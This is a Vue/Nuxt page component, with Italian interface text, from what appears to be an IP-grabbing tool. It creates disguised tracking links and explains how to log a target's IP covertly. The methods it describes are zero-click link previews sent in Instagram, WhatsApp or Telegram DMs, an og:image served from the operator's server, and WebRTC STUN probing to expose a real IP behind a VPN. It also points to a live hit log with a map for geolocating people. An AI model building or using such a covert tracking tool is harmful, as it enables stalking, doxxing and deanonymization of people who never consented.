<script setup lang="ts">
definePageMeta({ title: 'IP Tracking' })


const newTracker = reactive({ label: '', dest: 'https://www.instagram.com' })
const created = ref<any>(null)
const toast = useToast()

async function generate() {
  try {
    created.value = await createTracker(newTracker.label, newTracker.dest)
    toast.add({ title: 'Tracker creato', description: created.value.tracking_id, color: 'emerald' })
  } catch (e: any) {
    toast.add({ title: 'Errore', description: e.message, color: 'red' })
  }
}
</script>

<template>
  <div class="space-y-6">
    <div>
      <h1 class="text-2xl font-bold text-white">IP Tracking</h1>
      <p class="text-sm text-gray-500 mt-1">Crea link di tracking, monitora hit, geolocalizza target</p>
    </div>

    <!-- Create -->
    <UCard class="bg-gray-900/50">
      <template #header>
        <h2 class="text-sm font-semibold text-red-400">Crea Tracking Link</h2>
      </template>
      <div class="flex gap-2">
        <UInput v-model="newTracker.label" placeholder="Label" size="sm" class="flex-1" />
        <UInput v-model="newTracker.dest" placeholder="URL destinazione" size="sm" class="flex-1" />
        <UButton color="red" size="sm" @click="generate">Genera</UButton>
      </div>
      <div v-if="created" class="mt-4 grid grid-cols-2 gap-3">
        <UCard v-for="(url, key) in created.links" :key="key" class="bg-gray-950">
          <p class="text-[10px] text-emerald-400 font-semibold uppercase">{{ key }}</p>
          <code class="text-[10px] text-gray-300 break-all">{{ url }}</code>
        </UCard>
      </div>
    </UCard>

    <!-- Zero-click methods -->
    <div class="grid grid-cols-3 gap-4">
      <UCard class="bg-gray-900/50">
        <p class="text-sm font-medium text-emerald-400 mb-1">Link Preview</p>
        <p class="text-xs text-gray-500">Condividi in DM Instagram/WhatsApp/Telegram. La generazione della preview logga l'IP. Zero click.</p>
      </UCard>
      <UCard class="bg-gray-900/50">
        <p class="text-sm font-medium text-sky-400 mb-1">OG Image</p>
        <p class="text-xs text-gray-500">L'og:image nella preview e' hostato sul nostro server. Ogni device che renderizza la preview lo carica -> IP loggato.</p>
      </UCard>
      <UCard class="bg-gray-900/50">
        <p class="text-sm font-medium text-red-400 mb-1">WebRTC STUN</p>
        <p class="text-xs text-gray-500">Se il target apre la pagina, JavaScript probes STUN per rivelare l'IP reale anche dietro VPN/proxy.</p>
      </UCard>
    </div>

    <UCard class="bg-gray-900/50">
      <template #header>
        <h2 class="text-sm font-semibold text-gray-300">Trackers attivi</h2>
      </template>
      <p class="text-xs text-gray-500 text-center py-6">
        I tracker creati appariranno qui. Usa la pagina Flask su
        <a :href="`${base}/tracking`" target="_blank" class="text-emerald-400 hover:underline">/tracking</a>
        per la vista completa con mappa e hit log live.
      </p>
    </UCard>
  </div>
</template>
